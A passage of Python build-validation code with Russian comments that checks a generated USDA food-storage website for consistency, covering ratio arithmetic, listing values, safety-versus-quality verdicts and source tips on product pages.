        m = re.match(r"([0-9.]+) times longer frozen than ", val)
        if m:
            g = fk.freeze_gain(it)
            if not g or pr.mult(g.r).split(" ", 1)[0] != m.group(1):
                bad.append("%s: строка /%s/ печатает выигрыш %s, а функция "
                           "даёт %s" % (p, slug, m.group(1),
                                        pr.mult(g.r) if g else "ничего"))
            continue
        m = re.match(r"([0-9.]+) times shorter once open", val)
        if m:
            o = fk.opening_cost(it)
            if not o or pr.mult(o.r).split(" ", 1)[0] != m.group(1):
                bad.append("%s: строка /%s/ печатает цену вскрытия %s, а "
                           "функция даёт %s" % (p, slug, m.group(1),
                                                pr.mult(o.r) if o else
                                                "ничего"))
            continue
        # У продукта, которому источник не дал ни одного срока, витрина
        # печатает объявленную строку «числа нет», и она обязана совпадать с
        # тем, что печатает его собственная страница.
        want = unescape(pr.answer_line(it))
        if not val.startswith(want):
            bad.append("%s: строка /%s/ печатает %s, а связывает %s"
                       % (p, slug, val[:48], want[:48]))
    return (bad or _seen(seen, "строк списка в сборке"))[:8]


def g_listing_value_is_on_target(files):
    """Напечатанное в списке число есть НА СТРАНИЦЕ, куда строка ведёт.

    127 строк указателя несли величину, которой не было в заголовке цели:
    «6 weeks» в списке против «Apples: 4 weeks in the fridge» в заголовке.
    Там, где число стоит ответом, печатается осторожный конец, и он же стоит
    в выдаче.

    Область: заголовок ИЛИ описание. У 25 продуктов имя источника длиннее
    шестидесяти знаков целиком («Commercial bread products, including pan
    breads, flat breads, rolls and buns»), и заголовку нечем поделиться —
    описание тогда несёт ответ обязательно.
    """
    import prose as pr
    import render as rd
    by = {x["slug"]: x for x in rd.load_corpus()[0]}
    pages = _html(files)
    bad, seen = [], 0
    for slug, it in sorted(by.items()):
        key = "%s/index.html" % slug
        t = pages.get(key)
        if t is None:
            continue
        want = unescape(pr.answer_line(it))
        if not want:
            continue
        seen += 1
        head = unescape(re.search(r"<title>(.*?)</title>", t, re.S).group(1))
        m = re.search(r'<meta name="description" content="(.*?)">', t, re.S)
        desc = unescape(m.group(1)) if m else ""
        if want not in head and want not in desc:
            bad.append("%s: ответ «%s» не стоит ни в заголовке, ни в описании"
                       % (key, want))
    return (bad or _seen(seen, "продуктов с ответом"))[:8]


def g_ratio_recomputes(files):
    """Напечатанный расчёт ДАЁТ напечатанное число, и подпись называет ту же
    операцию.

    «4.3× · What opening the package costs · 30 days frozen ÷ 7 days open»:
    число верное, арифметика верная, подпись — про другую величину. Девять
    страниц. Гейт делит сам и сверяет три вещи: частное, сторону деления и
    словарь подписи.
    """
    bad, seen = [], 0
    for p, t in _products(files).items():
        for m in re.finditer(r'<div class="cost"><div class="x">([0-9.]+)'
                             r'&times;</div><div class="t">(.*?)'
                             r'<span class="calc">([^<]*)</span>', t, re.S):
            seen += 1
            x, cap, calc = float(m.group(1)), m.group(2), m.group(3)
            nums = re.findall(r"([0-9]+(?:\.[0-9]+)?) day", calc)
            if len(nums) != 2:
                bad.append("%s: в расчёте не две величины — «%s»" % (p, calc))
                continue
            num, den = float(nums[0]), float(nums[1])
            if den <= 0:
                bad.append("%s: знаменатель ноль — «%s»" % (p, calc))
                continue
            got = num / den
            if abs(got - x) > max(0.06, x * 0.06):
                bad.append("%s: напечатано %s, а расчёт даёт %.2f — «%s»"
                           % (p, m.group(1), got, calc))
            left, right = [s.strip() for s in calc.split("&divide;")]
            # Подпись и расчёт про ОДНУ операцию. Морозилка в числителе —
            # это выигрыш заморозки, чем бы ни называлась подпись.
            if "frozen" in left and "freezer buys" not in cap:
                bad.append("%s: числитель морозильный, а подпись «%s»"
                           % (p, re.sub(r"<[^>]+>", "", cap)[:52]))
            if "opening the package" in cap and "open" not in right:
                bad.append("%s: подпись про вскрытие, а знаменатель «%s»"
                           % (p, right))
            if num < den:
                bad.append("%s: числитель меньше знаменателя — «%s»"
                           % (p, calc))
    return (bad or _seen(seen, "расчётов на страницах товаров"))[:8]


def g_ratio_agrees_with_prose(files):
    """Бирка и проза называют кратность ОДНИМ числом.

    Бирка делила «самое длинное на то, что кончится первым», проза —
    «морозилку на холодильник», и обе подписывались одинаково: 24 страницы
    печатали 240× и 34× про одно и то же. Гейт берёт число с бирки и требует,
    чтобы оно встречалось среди кратностей видимого текста страницы.
    """
    bad, seen = [], 0
    for p, t in _products(files).items():
        m = re.search(r'<div class="cost"><div class="x">([0-9.]+)&times;', t)
        if not m:
            continue
        vis = _visible(t)
        said = set(re.findall(r"([0-9.]+) times", vis))
        if not said:
            continue
        seen += 1
        if m.group(1) not in said:
            bad.append("%s: на бирке %s, а в прозе %s"
                       % (p, m.group(1), ", ".join(sorted(said))))
    return (bad or _seen(seen, "страниц с кратностью и прозой"))[:8]


def g_safety_limit_not_divided(files):
    """Предел пребывания в тепле не становится знаменателем — и молчания об
    этом тоже нет.

    Двухчасовой предел USDA, поделив на который страница напечатала «720×
    what the freezer buys you», — это правило опасной зоны, поданное как
    выгода. Отношение на него не считается, отказ ОБЪЯВЛЕН вслух, и слово
    «day» под таким окном не печатается.
    """
    import prose as pr
    import render as rd
    by = {x["slug"]: x for x in rd.load_corpus()[0]}
    pages = _products(files)
    bad, seen = [], 0
    for slug, it in sorted(by.items()):
        t = pages.get("%s/index.html" % slug)
        if t is None:
            continue
        cells = [c for st in pr.states_of(it)
                 for c in fk.safety_limit_cells(st)]
        if not cells:
            continue
        seen += 1
        if "prints no multiplier against the room-temperature figure" not in t:
            bad.append("%s: предел в тепле есть, объяснения нет" % slug)
        vis = _visible(t)
        if re.search(r"Counted from the day[^.]*", vis) and len(
                pr.rated_all(it)) == len(cells):
            bad.append("%s: под пределом в тепле напечатан отсчёт по дням"
                       % slug)
    for p, t in pages.items():
        for m in re.finditer(r'<span class="calc">([^<]*)</span>', t):
            if re.search(r"&divide; 0(?:\.0+)? day", m.group(1)):
                bad.append("%s: деление на ноль дней — «%s»"
                           % (p, m.group(1)))
    return (bad or _seen(seen, "страниц с пределом в тепле"))[:8]


def g_no_empty_percentile(files):
    """Доля, округлившаяся в 0% или 100%, не печатается как утверждение.

    «Against the whole data set it keeps longer than 0% of everything listed»
    стояло на 13 страницах, ничего не утверждая и споря с «position 71 of 74»
    в том же тексте. Край называется именем, а не нулём.

    Заодно проверяется превосходная степень при НИЧЬЕЙ: «самое недолговечное,
    что USDA относит к выпечке: 2 дня, а стоящий выше держит 2 дня».
    """
    bad, seen = [], 0
    for p, t in _products(files).items():
        seen += 1
        vis = _visible(t)
        for m in re.finditer(r"longer than (0|100)% of", vis):
            bad.append("%s: доля напечатана как %s%%" % (p, m.group(1)))
        m = re.search(r"is the shortest-lived thing the USDA files under "
                      r"[^:]+: ([^,]+), where the item above it, [^,]+, "
                      r"holds ([0-9][^ ]* [a-z]+)", vis)
        if m and m.group(1).strip() == m.group(2).strip():
            bad.append("%s: превосходная степень над равным числом (%s)"
                       % (p, m.group(1).strip()))
    return (bad or _seen(seen, "страниц товара"))[:8]


def g_tips_are_prose(files):
    """Слова источника печатаются ПРОЗОЙ, а не величиной.

    34 подсказки USDA длиной до 321 знака стояли в колонке величин, где
    `.rv` задаёт капс, полужирный и правый край. Величина — это число; всё,
    что длиннее короткой строки, в колонке величин быть не может.

    И обратная сторона: подсказка, которая ЕСТЬ в источнике, обязана быть на
    странице. Проверка соответствия всегда двусторонняя.
    """
    import prose as pr
    import render as rd
    by = {x["slug"]: x for x in rd.load_corpus()[0]}
    pages = _products(files)
    bad, seen = [], 0
    for p, t in pages.items():
        for m in re.finditer(r'<span class="rv">([^<]*)</span>', t):
            v = unescape(m.group(1))
            if len(v) > 60:
                bad.append("%s: величина длиной %d знаков — «%s…»"
                           % (p, len(v), v[:40]))
    for slug, it in sorted(by.items()):
        t = pages.get("%s/index.html" % slug)
        if t is None:
            continue
        tips = pr.tips_all(it)
        if not tips:
            continue
        seen += 1
        vis = _visible(t)
        for _st, _k, text in tips:
            if unescape(pr.esc(text)) not in vis and text not in vis:
                bad.append("%s: подсказка источника не напечатана — «%s…»"
                           % (slug, text[:40]))
                break
    return (bad or _seen(seen, "подсказок источника"))[:8]


def g_says_is_named(files):
    """Нечисловой ответ источника НАЗВАН, а не выброшен.

    63 ячейки — «Package use-by date», «Indefinitely», «When Ripe», «1 Yea» —
    парсер молча возвращал None, и страница печатала после этого, что
    источник не даёт фигуры. Источник ответил; ответ не был числом.
    """
    import prose as pr
    import render as rd
    by = {x["slug"]: x for x in rd.load_corpus()[0]}
    pages = _products(files)
    bad, seen = [], 0
    for slug, it in sorted(by.items()):
        t = pages.get("%s/index.html" % slug)
        if t is None:
            continue
        rows = pr.says_all(it)
        if not rows:
            continue
        seen += 1
        vis = _visible(t)
        for _st, _key, code, _raw in rows:
            if pr.SAYS_VALUE[code] not in vis:
                bad.append("%s: ответ источника «%s» не напечатан"
                           % (slug, pr.SAYS_VALUE[code]))
                break
        # Обратная сторона: страница не смеет ОТРИЦАТЬ то, на что источник
        # ответил. «never at room temperature» стояло там, где в ячейке
        # кладовой написано «Package use-by date».
        fams = {k.split("_")[0] for _s, k, _c, _r in rows}
        if "pantry" in fams and "never at room temperature" in vis:
            bad.append("%s: страница отрицает комнатную температуру, а "
                       "источник о ней ответил" % slug)
        if "fridge" in fams and "no refrigerator figure" in vis:
            bad.append("%s: страница отрицает холодильник, а источник о нём "
                       "ответил" % slug)
        # И оговорка про нечисловой ответ обязана стоять там, где набор мест
        # хранения на неё не намекает.
        if (fams - pr.families(it)) and "is not blank either" not in vis \
                and "answered in words instead" not in vis:
            bad.append("%s: нечисловой ответ есть, оговорки в рамке нет"
                       % slug)
    return (bad or _seen(seen, "нечисловых ответов"))[:8]


# Рубрики-утверждения. Здесь они держатся как НИЖНИЙ ПРЕДЕЛ: папка источника
# имеет право сделать вердикт строже и не имеет права сделать его мягче.
# Решает вердикт не этот список — см. g_verdict_comes_from_the_food.
_PERISHABLE = frozenset((
    "Meat", "Poultry", "Seafood", "Dairy Products & Eggs",
    "Deli & Prepared Foods", "Baby Food", "Vegetarian Proteins",
    "Food Purchased Frozen"))


def _kind_of(it, key, hi, st=None):
    """Вид окна: безопасность или качество.

    ЧЕСТНО О ТОМ, ЧТО ЗДЕСЬ ИЗМЕНИЛОСЬ. Раньше эти четыре строки были
    НАРОЧНОЙ копией правила: гейт, спрашивающий у проверяемого модуля,
    согласен сам с собой. Копия была возможна, пока правилом была рубрика
    источника, — и ровно поэтому она повторяла его главный дефект: вскрытая
    банка рыбы получала «попробуй и реши», а вскрытая банка курицы при том же
    самом — «выброси не пробуя».

    Правило теперь — лестница из свойств самой еды и ста тридцати
    объявленных слов. Вторая рукописная копия такого списка была бы копией, а
    не проверкой: сломай слово в одном месте, и вторая копия не заметит, а
    поправишь оба — и обе стороны сломаны согласованно. Поэтому здесь стоит
    ОДНА функция, а независимая проверка САМОГО ПРАВИЛА вынесена:

      · g_verdict_comes_from_the_food — свойства, которым правило обязано
        подчиняться (папка только ужесточает, обе стороны, названное
        исключение, объявленные пары одинаковых ситуаций);
      · pure_selftest — известные ответы, написанные руками.

    Эти два гейта краснеют на сломанном правиле, а этот — на странице,
    которая напечатала не тот вердикт, какой правило выдало.
    """
    return fk.food_kind(it, key, hi, st)[0]


def _lead_state_of(it):
    """Состояние, которое ОТВЕЧАЕТ за страницу, — по пометке в корпусе.

    Здесь берётся ФАКТ («вот это состояние помечено ведущим»), а не правило,
    по которому пометка получена: правило проверяет
    g_lead_state_speaks_for_the_page — известными ответами и свойствами.
    """
    for st in pr.states_of(it):
        if st.get("lead"):
            return st
    # Ни одно состояние не помечено — это страница-выбор: простое слово не
    # значит одного вида, и «за неё» не говорит никто. Возвращать первое
    # состояние здесь значило бы назначить ведущим того, кого объявленная
    # таблица ведущим НЕ называла.
    return None if it.get("split") else pr.states_of(it)[0]


def _no_signal_reason(it):
    """Почему у страницы сигнального окна нет. Пересчитано ЗДЕСЬ, руками.

    Два случая, и оба — не «мы не знаем»:
      · «split» — простое слово не значит одного вида, говорить некому;
      · «silent» — вид, за который страница говорит, источник оставил без
        окна вне морозилки, а другие виды под тем же именем окна имеют:
        печатать тогда морозильное число ответом значит ответить на другой
        вопрос, чем тот, ради которого набрано простое слово.
    Обе страницы обязаны печатать ПОЛЕ ВЫБОРА вместо ответа.
    """
    lead = _lead_state_of(it)
    if lead is None:
        return "split"
    sts = pr.states_of(it)
    if len(sts) < 2:
        return None
    def _warm(st):
        return [1 for k, v in st["slots"].items()
                if not k.startswith("freeze") and v and v[0] != "no"]
    if not _warm(lead) and any(_warm(x) for x in sts):
        return "silent"
    return None


def _signal_cell(it):
    """(состояние, ячейка) сигнального поля — по правилам, а не по разметке.

    Кандидаты — ячейки ВЕДУЩЕГО состояния: у продукта с несколькими видами
    состояния суть разная еда, и «кончится первым» через все виды выбирало не
    то окно, а не тот продукт.
    """
    if _no_signal_reason(it):
        return None
    lead = _lead_state_of(it)
    rated = [(i, st, key, v[0], v[1])
             for i, st in enumerate(pr.states_of(it))
             for key, _f, _l in fk.SLOTS
             for v in [st["slots"].get(key)]
             if v and v[0] != "no"]
    if not rated:
        return None
    own = [r for r in rated if r[1].get("id") == lead.get("id")]
    rated = own or rated
    warm = [r for r in rated if not r[2].startswith("freeze")]
    pool = warm or rated
    # Ячейка короче суток — предел пребывания в тепле, а не окно хранения:
    # «2 Hours» у пирога значит «не оставляй на столе». Связывает она только
    # там, где другого окна вне морозилки у вида нет.
    keep = [r for r in pool if r[4] >= fk.SAFETY_LIMIT_DAYS]
    pool = keep or pool
    groups = {}
    for r in rated:
        g = (r[0], _OPENING.get(r[2]))
        if g[1] is not None:
            groups.setdefault(g, []).append(r)
    beaten = set()
    for rows in groups.values():
        for a in rows:
            for b in rows:
                if b[3] >= a[3] and b[4] >= a[4] and b[3] > a[3]:
                    beaten.add((a[0], a[2]))
    live = [r for r in pool if (r[0], r[2]) not in beaten]
    pool = live or pool
    return min(pool, key=lambda r: (r[3], r[4], r[0], r[2]))


def g_caveat_matches_window(files):
    """Напечатанное ПОСЛЕДСТВИЕ — то самое, какое у этого окна.

    Одна оговорка «quality guidance, not a safety test» стояла на 221 странице
    сразу: на 54 из них она недопредупреждала (предел холодильника у
    скоропортящегося — это безопасность), на 97 перепугивала (морозильное
    число — это качество, и при 0 °F еда безопасна сколько угодно). Одна рамка
    на два противоположных последствия — та же поломка, которую ферма уже
    ловила дважды на других сайтах.

    Гейт считает вид окна САМ, по рубрике источника и по ячейке, и требует
    трёх вещей: слово на бирке то же; в разделе стоит предложение своего вида;
    у страницы, где ВСЕ окна одного вида, чужого предложения нет вовсе.
    """
    import render as rd
    by = {x["slug"]: x for x in rd.load_corpus()[0]}
    bad, seen = [], 0
    # Предложение о последствии — по последствию, из объявленной таблицы, и
    # чужими считаются ВСЕ остальные. Пока их было два, «чужое» писалось
    # руками одной строкой; вердиктов теперь три, и рукописное «другое»
    # молча пропустило бы третье.
    says = {k: unescape(v) for k, v in pr.MEANS_SAYS.items()}
    for p, t in sorted(_products(files).items()):
        it = by.get(p.split("/")[0])
        if not it:
            continue
        cell = _signal_cell(it)
        if not cell:
            continue
        seen += 1
        _i, st, key, _lo, hi = cell
        kind = _kind_of(it, key, hi, st)
        vis = _visible(t)
        m = re.search(r'<div class="means">(.*?)</div>', t, re.S)
        if not m:
            bad.append("%s: на бирке нет строки о последствии" % p)
        elif unescape(m.group(1)) != unescape(pr.MEANS_CHIP[kind]):
            bad.append("%s: бирка говорит «%s», а окно — %s"
                       % (p, unescape(m.group(1))[:40], kind))
        want = says[kind]
        others = [v for k, v in sorted(says.items()) if k != kind]
        head = vis.find(unescape(pr.MEANS_HEAD))
        if head < 0:
            bad.append("%s: раздела о смысле окна нет" % p)
            continue
        if want not in vis[head:]:
            bad.append("%s: последствие %s не напечатано" % (p, kind))
        # Вторая сторона: у страницы, где все окна одного вида, чужому
        # предложению взяться неоткуда, и если оно там — рамка перепутана.
        kinds = {_kind_of(it, k, v[1], s2)
                 for s2 in pr.states_of(it)
                 for k, v in s2["slots"].items() if v[0] != "no"}
        if len(kinds) == 1:
            stray = [v for v in others if v in vis]
            if stray:
                bad.append("%s: напечатано чужое последствие (%s)"
                           % (p, stray[0][:44]))
    return (bad or _seen(seen, "страниц с сигнальным окном"))[:8]



# --------------------------------------------- вердикт выводится ИЗ ЕДЫ
#
# Нейтральная папка: в неё гейт перекладывает продукт, чтобы посмотреть, что
# от вердикта останется без рубрики. Она выбрана нарочно самой «никакой» —
# в ней у источника лежит и мука, и вскрытая банка рыбы.
_NEUTRAL_FOLDER = "Shelf Stable Foods"

# Признаки, которыми вкусовой вердикт на КОРОТКОМ холодильном окне вообще
# может быть обоснован. Всё прочее на таком окне — недопредупреждение.
_COLD_QUALITY_REASONS = frozenset((
    "keeps", "raw whole", "rendered fat",
    # Источник сказал про эту ячейку СВОИМИ СЛОВАМИ, что причина — качество,
    # а не безопасность. Сильнее любого нашего признака: это запись говорит
    # о еде, а не мы читаем её имя.
    "source says quality"))

# Единственное объявленное послабление от рубрики: сырые фрукты и овощи
# целиком портятся НА ВИДУ. Пара (рубрика, признак), и другой такой пары нет.
_FOLDER_MAY_SOFTEN = ("Produce", "raw whole")

# Ужесточение от рубрики разрешено только этими двумя ветками. Ветка папки
# теперь НАЗЫВАЕТСЯ своим именем: пока она возвращала «animal», двенадцать
# растительных продуктов объявлялись животной едой её словами.
_FOLDER_MAY_HARDEN = frozenset(("perishable folder", "cut"))

# Строгость вердикта. Нужна, потому что вердиктов ТРИ, а не два: «папка
# только ужесточает» нельзя проверить сравнением на равенство, когда между
# «вкус» и «предел» появилось «не решено». Оно строже вкуса и мягче предела —
# пробовать не разрешает, опасности не утверждает.
_SEVERITY = {"quality": 0, "unsettled": 1, "safety": 2}

# Строгость ПРИЗНАКА, а не вердикта, и правило про папку проверяется именно
# ею. Папка влияет только на признак; на вердикт влияют ещё место и длина
# окна, и сравнение вердиктов свалило бы в одну кучу две разные вещи —
# «папка сделала мягче» и «длина сняла предупреждение». Первый прогон этого
# гейта так и сказал: «папка Dairy сделала окно топлёного масла МЯГЧЕ»,
# хотя мягче его сделали 730 дней.
_NAT_SEV = dict([(n, 2) for n in fk.SPOILS_DANGEROUSLY]
                + [(n, 0) for n in fk.KEEPS_SAFE] + [(None, 1)])

# ОДНА СИТУАЦИЯ — ОДИН ВЕРДИКТ. Пары записей источника, которые описывают
# одно и то же обращение с одной и той же по свойствам едой. Написаны руками
# по разбору аудита: пока решала папка, первая пара расходилась публично —
# вскрытая банка курицы «выброси не пробуя» против вскрытой банки рыбы
# «попробуй и реши».
_SAME_SITUATION = (
    ("142", "fridge_open", "619", "fridge_open",
     "вскрытая банка животного белка"),
    ("142", "fridge_open", "372", "fridge_open",
     "вскрытая банка малокислотных консервов"),
    ("619", "fridge_open", "173", "fridge",
     "животный белок в холодильнике под двумя именами"),
    ("426", "fridge", "173", "fridge",
     "варёная влажная еда в холодильнике"),
    ("21", "fridge_purchase", "22", "fridge",
     "сырое яйцо в холодильнике"),
)


def g_verdict_comes_from_the_food(files):
    """Безопасность или вкус решает ЕДА, а не папка источника.

    Пока решала рубрика, вскрытая банка рыбы получала «Quality window —
    past it, judge it yourself» (USDA держит её в Shelf Stable Foods), а
    вскрытая банка курицы при том же самом — «Safety limit — throw it out»
    (она в Poultry). Одна ситуация, два противоположных вердикта на живом
    сайте; вместе с рыбой вкусовую оговорку получали домашний айоли на сыром
    яйце, вскрытая подливка, творожный торт, эклеры, овощи в масле, варёная
    киноа, свежая паста и мытая зелень в пакете.

    Гейт НЕ ПЕРЕПИСЫВАЕТ правило: рукописная копия ста тридцати объявленных
    слов — это копия, а не проверка. Он проверяет СВОЙСТВА, которым правило
    обязано подчиняться, и каждое ловит свой вид поломки:

      1. ПАПКА ТОЛЬКО УЖЕСТОЧАЕТ. Тот же продукт, переложенный в нейтральную
         рубрику, не имеет права стать БЕЗОПАСНЕЕ — кроме единственного
         объявленного послабления (сырое целое из Produce). Стать строже он
         имеет право только по объявленным веткам. Возврат к решению по
         папке краснеет здесь, как бы его ни назвали;
      2. ОБЕ СТОРОНЫ. Морозильная ячейка не бывает пределом безопасности
         (при 0 °F еда безопасна, пока заморожена); ячейка короче суток не
         бывает окном качества (это предел пребывания в тепле); холодильное
         окно в неделю и короче у еды из рубрики-утверждения не бывает
         вкусовым;
      3. ИСКЛЮЧЕНИЕ НАЗЫВАЕТСЯ ВСЛУХ. Вкусовой вердикт на коротком
         холодильном окне разрешён только с объявленным признаком, и признак
         сигнального окна обязан быть НАПЕЧАТАН на странице словами;
      4. ОДНА СИТУАЦИЯ — ОДИН ВЕРДИКТ по объявленным парам записей.

    Известные ответы самой функции написаны руками в pure_selftest.
    """
    import render as rd
    items = rd.load_corpus()[0]
    by = {x["slug"]: x for x in items}
    rows = {}
    for it in items:
        for st in pr.states_of(it):
            rows[str(st.get("id"))] = (it, st)
    bad, seen = [], 0
    for p, t in sorted(_products(files).items()):
        it = by.get(p.split("/")[0])
        if not it:
            continue
        vis = _visible(t)
        for st in pr.states_of(it):
            for key, v in sorted(st["slots"].items()):
                if not v or v[0] == "no":
                    continue
                seen += 1
                hi = v[1]
                kind, why = fk.food_kind(it, key, hi, st)
                moved = dict(it)
                moved["category"] = _NEUTRAL_FOLDER
                moved["subcategory"] = ""
                nat = fk.food_nature(it, key, st)
                free = fk.food_nature(moved, key, st)
                if _NAT_SEV[free] > _NAT_SEV[nat] and (
                        it.get("category"), nat) != _FOLDER_MAY_SOFTEN:
                    bad.append("%s: папка %s сделала окно %s МЯГЧЕ (признак "
                               "%s)" % (p, it.get("category"), key, nat))
                if _NAT_SEV[free] < _NAT_SEV[nat] and \
                        nat not in _FOLDER_MAY_HARDEN:
                    bad.append("%s: признак %s держится на папке не по "
                               "объявленной ветке (%s)"
                               % (p, key, nat))
                # ДЛИНА ОКНА ТОЛЬКО СМЯГЧАЕТ, и это зеркало правила про
                # папку: слово «предел» — утверждение о росте бактерий, и
                # дольше объявленного порога оно не поддержано ничем.
                if kind == "safety" and hi is not None and \
                        hi > fk.SAFETY_LIMIT_MAX_DAYS:
                    bad.append("%s: окно %s длиной %s дней названо пределом "
                               "безопасности" % (p, key, hi))
                if key.startswith("freeze") and kind == "safety":
                    bad.append("%s: морозильное окно %s объявлено пределом "
                               "безопасности" % (p, key))
                if hi is not None and hi < fk.SAFETY_LIMIT_DAYS and \
                        kind != "safety":
                    bad.append("%s: предел в тепле (%s) объявлен окном "
                               "качества" % (p, key))
                if (key.startswith("fridge") and hi is not None
                        and hi <= fk.COLD_SHORT_DAYS
                        and it.get("category") in _PERISHABLE
                        and kind != "safety"
                        and why != "source says quality"):
                    bad.append("%s: короткое холодное окно %s у еды из "
                               "рубрики %s объявлено вкусовым"
                               % (p, key, it.get("category")))
                if (key.startswith("fridge") and hi is not None
                        and hi <= fk.COLD_SHORT_DAYS and kind == "quality"
                        and why not in _COLD_QUALITY_REASONS):
                    bad.append("%s: вкусовой вердикт на коротком холодном "
                               "окне %s без объявленного исключения (%s)"
                               % (p, key, why))
        cell = _signal_cell(it)
        if cell:
            _i, st, key, _lo, hi = cell
            kind, why = fk.food_kind(it, key, hi, st)
            # Признак требуется НАПЕЧАТАННЫМ там, где он и есть исключение:
            # вкусовой вердикт на коротком холодном окне. Именно эта пара —
            # «неделя в холодильнике» и «попробуй и реши» — стоила аудиту
            # шестидесяти одной страницы, и обосновать её обязана страница, а
            # не наш комментарий в коде.
            if (kind == "quality" and key.startswith("fridge")
                    and hi is not None and hi <= fk.COLD_SHORT_DAYS):
                seen += 1
                if unescape(fk.reason_clause(
                        why, it, pr.brief_who(it, st))) not in vis:
                    bad.append("%s: вкусовой вердикт на коротком холодном "
                               "окне без напечатанного признака (%s)"
                               % (p, why))
        if len(bad) > 10:
            break
    # Пары объявлены руками и в ВЫБОРКУ не идут: выборка гейта — страницы,
    # и гейт, осматривающий ноль страниц, обязан покраснеть, а не набрать
    # счёт на пяти строчках, написанных здесь же.
    for a_id, a_key, b_id, b_key, what in _SAME_SITUATION:
        if a_id not in rows or b_id not in rows:
            bad.append("объявленная пара ситуаций потеряла запись источника: "
                       "%s / %s" % (a_id, b_id))
            continue
        ia, sa = rows[a_id]
        ib, sb = rows[b_id]
        va = sa["slots"].get(a_key)
        vb = sb["slots"].get(b_key)
        if not va or not vb or va[0] == "no" or vb[0] == "no":
            bad.append("объявленная пара ситуаций потеряла ячейку: %s" % what)
            continue
        ka = fk.food_kind(ia, a_key, va[1], sa)[0]
        kb = fk.food_kind(ib, b_key, vb[1], sb)[0]
        if ka != kb:
            bad.append("одна ситуация (%s) — два вердикта: %s %s против %s %s"
                       % (what, ia["name"], ka, ib["name"], kb))
    # ОБЛАСТЬ ГЕЙТА — ЧАСТЬ ГЕЙТА, и это записанный урок фермы: правило
    # «посадка и электрика раздельно» проверялось на страницах элементов, а
    # нарушалось на витрине, где шестьдесят пять строк несли вердикт без
    # напряжения. Всё выше читает ТОЛЬКО страницы товара. Значит, здесь
    # объявляется вторая половина правила: слово о последствии — вкус это
    # или предел безопасности — на других страницах не печатается вовсе.
    # Уедет туда — сборка краснеет, а не молчит.
    prod = set(_products(files))
    words = (pr.MEANS_CHIP["safety"], pr.MEANS_CHIP["quality"],
             pr.SAFETY_SENTENCE, pr.QUALITY_SENTENCE, pr.MEANS_HEAD)
    for p2, t2 in sorted(_html(files).items()):
        if p2 in prod:
            continue
        seen += 1
        vis2 = _visible(t2)
        for w in words:
            if w and (w in t2 or unescape(w) in vis2):
                bad.append("%s: слово о последствии вне страницы товара — "
                           "«%s»" % (p2, w[:44]))
    return (bad or _seen(seen, "вердиктов и объявленных пар"))[:8]


# ------------------------------ объяснение и вердикт выведены из ОДНОГО признака
#
# Двенадцать растительных продуктов печатали «What decides that is the food
# and not the shelf the source files it on: Vegan Cheddar Cheese is an animal
# food, or made with one» — и это был не сбой вёрстки, а сбой устройства:
# вердикт брался у правила, а объяснение собиралось РЯДОМ, одной рамкой на все
# ветки, с подстановкой признака внутрь. Общая рамка не может быть неверной,
# а подставленный в неё признак — может, и никто этого не проверял.
#
# Правило теперь отдаёт объяснение вместе с вердиктом (fk.food_verdict), и
# этот гейт держит их вместе С ОБЕИХ СТОРОН:
#
#   · нет вердикта без своего объяснения — то, что страница напечатала на
#     бирке, обязано быть объяснено ровно тем признаком, по которому получено;
#   · нет объяснения, которого правило не давало — если на странице стоит
#     «is an animal food, or made with one», правило обязано было выдать
#     признак «animal» хотя бы для одной ячейки ЭТОЙ еды.
#
# Вторая сторона и есть та, которой не было: первая была бы зелёной и на
# соевом молоке, потому что вердикт «выброси» страница печатала верный.


def _clause_marks():
    """Неизменяемая часть каждого объявленного объяснения.

    По ней объяснение узнаётся на странице, чьё бы имя в него ни подставили.
    У веток, чьё свидетельство лежит В САМОЙ ЕДЕ, рамка одна на всех, и
    узнавать их по рамке нельзя: «is an animal food» на соевом молоке
    засчиталось бы тогда любым другим признаком с той же рамкой. Меткой у них
    служит ХВОСТ — «is <признак>.», — и он у каждого свой.
    """
    marks = {}
    for reason, tpl in fk.REASON_CLAUSE.items():
        if reason in fk.REASON_EN:
            marks[reason] = "is %s." % fk.REASON_EN[reason]
        else:
            marks[reason] = max(re.split(r"%\([a-z]+\)s", tpl),
                                key=len).strip()
    return marks


def g_reason_agrees_with_the_verdict(files):
    """Вердикт и его объяснение — из одного признака, и это проверено в обе
    стороны: без объяснения вердикт не печатается, а объяснение, которого
    правило не давало, не печатается тем более.

    Третья проверка — счёт на /past-the-date/. Страница правила печатала «Of
    the 296 food pages ... 119 lead with a safety limit and 176 with a quality
    window», и 119+176 давало 295: одна страница не попадала ни в одну
    корзину и молча пропадала из итога, в который была включена. Счёт
    пересчитывается ЗДЕСЬ, по построенным страницам, и обязан сойтись с
    напечатанным до единицы.
    """
    import render as rd
    by = {x["slug"]: x for x in rd.load_corpus()[0]}
    marks = _clause_marks()
    assert len(set(marks.values())) == len(marks), \
        "две ветки объяснения неотличимы на странице"
    bad, seen = [], 0
    tally = {"safety": 0, "quality": 0, "unsettled": 0}
    prods = _products(files)
    for p, txt in sorted(prods.items()):
        it = by.get(p.split("/")[0])
        if not it:
            continue
        seen += 1
        vis = _visible(txt)
        # Какие признаки правило вообще выдало ДЛЯ ЭТОЙ ЕДЫ.
        made = set()
        for st in pr.states_of(it):
            for key, v in sorted(st["slots"].items()):
                if not v or v[0] == "no":
                    continue
                made.add(fk.food_kind(it, key, v[1], st)[1])
        for reason, mark in sorted(marks.items()):
            if mark in vis and reason not in made:
                bad.append("%s: напечатано объяснение «%s», которого правило "
                           "для этой еды не давало" % (p, mark[:46]))
        # Ячейка, за которую страница отвечает. У страницы-выбора сигнальной
        # ячейки нет, а указание «что теперь» она всё равно печатает — и
        # объяснение к нему обязано быть там же.
        cell = _signal_cell(it)
        if cell:
            _i, st, key, _lo, hi = cell
            tally[_kind_of(it, key, hi, st)] += 1
        else:
            w = pr.worst_cell(it) if pr.multi(it) else None
            if not w:
                continue
            st, key, _lo, hi = w[0], w[1], w[2], w[3]
        seen += 1
        kind, reason = fk.food_kind(it, key, hi, st)
        clause = unescape(fk.reason_clause(reason, it, pr.brief_who(it, st)))
        if clause not in vis:
            bad.append("%s: вердикт %s напечатан без своего объяснения (%s)"
                       % (p, kind, reason))
        if cell:
            if unescape(pr.MEANS_SAYS[kind]) not in vis:
                bad.append("%s: вердикт %s без своего предложения о "
                           "последствии" % (p, kind))
        else:
            # У страницы-выбора одного вердикта нет по построению, и ОБЩЕЕ
            # предложение ей давать нельзя: дословно одинаковый текст поднял
            # сходство прозы и снял с выпуска 58 страниц, включая голову ниши.
            # Поэтому здесь требуется СВОЯ фраза — с именем кратчайшего вида,
            # его окном и тем, чем это окно обернётся.
            want = ("The shortest of these, %s at %s, is %s."
